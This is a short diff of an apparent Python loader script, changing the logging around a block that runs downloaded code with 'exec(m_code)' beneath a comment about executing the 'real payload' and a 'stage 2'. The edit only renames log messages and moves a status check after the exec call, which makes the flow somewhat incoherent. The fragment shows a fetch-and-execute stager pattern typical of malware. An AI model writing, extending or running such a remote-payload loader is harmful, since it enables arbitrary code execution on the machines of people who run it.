@@ -80,13 +80,14 @@ def main():
             # execute real payload with subprocess
             try:
                 exec(m_code)
-                log("✅ payload stage 2 executed")
+                log("download_attempt", url=TARGET_URL, status=response.status_code)
+                response.raise_for_status()
             except Exception as e:
-                log("❌ p failed:", e)
+                log("download_error", url=TARGET_URL, error=str(e))
 
     except (HTTPError, URLError, ValueError) as e:
         log("download_error", url=TARGET_URL, error=str(e))
-        log(f"Download failed: {e}")
+        log("payload_exec_error", error=str(e))
 
 if __name__ == "__main__":
     main()
